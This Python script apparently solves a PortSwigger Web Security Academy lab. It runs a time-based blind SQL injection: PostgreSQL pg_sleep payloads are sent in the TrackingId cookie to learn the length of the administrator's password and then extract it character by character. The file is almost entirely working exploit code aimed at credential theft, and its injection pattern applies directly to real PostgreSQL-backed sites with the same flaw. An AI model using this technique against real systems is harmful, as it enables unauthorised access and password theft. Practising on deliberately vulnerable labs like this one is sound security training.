import requests
import string
import time

url = "https://aca51ff51e3c22e0c05c37bd0054005b.web-security-academy.net/filter?category=Corporate+gifts"
################### Size of password ####################

size_pwd = 0
aux_cont = 0
print('= Verify size of password =')
while True:
    aux_cont = aux_cont + 1
    exploit_sizepassword =f"NOkf3ASovODKTeja'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>{aux_cont})+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--"
    cookie = {
        "TrackingId":exploit_sizepassword, 
        "session":"7vbwsN3kRn0KaTRsijAlOsL7gzwEb5aR"
    }
    s = requests.Session()
    time_start = time.perf_counter()
    r = s.get(url, cookies=cookie)
    time_end = time.perf_counter()
    tmp = time_end - time_start
    if int(tmp) == 3:
        size_pwd = size_pwd + 1
    else:
        break
    #print (r.status_code)
    s.close()

print (f'Password_size = {size_pwd+1} characters')

pwd_final = size_pwd+1

############################ Stealing Data #############################
password = list('')
leter = string.ascii_lowercase + string.digits
leters = list(leter)
print('= Stealing password =')
while True:
    for character in leters:
        position = len(password) + 1
        exploit_password =f"7v20Gr7e9SvJXSG0'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{character}')+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END+FROM+users--"
        cookie = {
            "TrackingId":exploit_password, 
            "session":"DpYzdTK6qYrghyDp8Z1MUn2D11NLfDjG"
        }
        time_start = time.perf_counter()
        r = requests.get(url, cookies=cookie)
        time_end = time.perf_counter()
        tmp = time_end - time_start
        if int(tmp) == 3:
            password.append(character)
            break
        #print(f"Password = {''.join(password) + character}")
    if position == (pwd_final+1):
        break

print(f"Final Password: {''.join(password)}")